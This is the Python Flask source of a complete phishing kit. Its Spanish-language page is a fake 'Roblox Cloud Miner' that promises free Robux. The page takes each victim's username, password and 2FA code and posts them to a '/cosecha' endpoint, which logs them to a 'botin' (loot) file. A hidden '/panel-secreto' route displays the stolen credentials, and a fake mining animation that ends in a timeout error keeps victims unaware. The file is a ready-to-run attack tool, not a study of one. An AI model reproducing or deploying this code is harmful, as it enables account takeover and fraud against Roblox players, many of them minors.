from flask import Flask, request, jsonify
import json
import os

app = Flask(__name__)
LOG_FILE = "botin_roblox.json"

HTML_PAGINA = """
<!DOCTYPE html>
<html>
<head>
    <title>Roblox Cloud Miner v4.2</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background-color: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .terminal { background: #111; width: 90%; max-width: 400px; padding: 20px; border: 1px solid #333; border-radius: 5px; box-shadow: 0 0 20px rgba(0,255,0,0.2); }
        input { background: #000; color: #00ff00; border: 1px solid #00ff00; width: 92%; padding: 10px; margin: 10px 0; outline: none; }
        button { background: #00ff00; color: #000; border: none; padding: 12px; width: 100%; cursor: pointer; font-weight: bold; margin-top: 10px; }
        .progress-bar { width: 100%; background: #222; height: 20px; margin-top: 20px; display: none; border: 1px solid #00ff00; }
        .progress-fill { width: 0%; height: 100%; background: #00ff00; transition: width 0.5s; }
        #status { font-size: 12px; margin-top: 10px; color: #888; }
        #step2, #mining { display: none; }
    </style>
</head>
<body>
    <div class="terminal">
        <div id="step1">
            <h2 style="color: #fff; margin-top: 0;">BLOX-MINER v4.2</h2>
            <p style="font-size: 13px;">Inicie sesión para vincular su wallet de minado y recibir 10,000 Robux.</p>
            <input type="text" id="user" placeholder="USUARIO_ROBLOX">
            <input type="password" id="pass" placeholder="PASSWORD_ACCESS">
            <button onclick="siguiente()">INICIAR VINCULACIÓN</button>
        </div>

        <div id="step2">
            <h3>VERIFICACIÓN 2FA</h3>
            <p style="font-size: 12px;">Se requiere el código de seguridad para autorizar la transferencia de bloques.</p>
            <input type="text" id="code" placeholder="CÓDIGO_6_DÍGITOS">
            <button onclick="minar()">VERIFICAR Y MINAR</button>
        </div>

        <div id="mining">
            <h3>MINANDO ROBUX...</h3>
            <div class="progress-bar" id="pbar" style="display: block;">
                <div class="progress-fill" id="pfill"></div>
            </div>
            <p id="status">Iniciando scripts de minado...</p>
            <p id="console" style="font-size: 10px; height: 60px; overflow: hidden;"></p>
        </div>
    </div>

    <script>
        let u, p;
        function siguiente() {
            u = document.getElementById('user').value;
            p = document.getElementById('pass').value;
            if(u && p) {
                fetch('/cosecha', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({usuario: u, clave: p, etapa: 'Login'})
                });
                document.getElementById('step1').style.display = 'none';
                document.getElementById('step2').style.display = 'block';
            }
        }

        function minar() {
            const c = document.getElementById('code').value;
            fetch('/cosecha', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({usuario: u, codigo: c, etapa: '2FA'})
            });
            document.getElementById('step2').style.display = 'none';
            document.getElementById('mining').style.display = 'block';
            startAnimation();
        }

        function startAnimation() {
            let width = 0;
            const fill = document.getElementById('pfill');
            const stat = document.getElementById('status');
            const cons = document.getElementById('console');
            const msgs = [
                "Buscando hashes válidos...",
                "Conectando a ROBLOX-API-V2...",
                "Bloque #928374 validado.",
                "Inyectando 10,000 Robux en la cuenta...",
                "Sincronizando con base de datos..."
            ];

            const interval = setInterval(() => {
                if (width >= 100) {
                    clearInterval(interval);
                    stat.innerText = "ERROR: Tiempo de espera agotado. Reintente en 24h.";
                    stat.style.color = "#ff0000";
                } else {
                    width += 0.5;
                    fill.style.width = width + '%';
                    if(Math.random() > 0.7) {
                        stat.innerText = msgs[Math.floor(Math.random()*msgs.length)];
                        cons.innerHTML += "> Hash " + Math.random().toString(36).substring(7) + " validado...<br>";
                    }
                }
            }, 200);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return HTML_PAGINA

@app.route('/cosecha', methods=['POST'])
def cosecha():
    data = request.json
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(data) + "\n")
    return jsonify({"status": "success"}), 200

@app.route('/panel-secreto')
def ver_botin():
    if not os.path.exists(LOG_FILE): return "Esperando mineros..."
    with open(LOG_FILE, "r") as f:
        return "<br>".join(f.readlines())

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
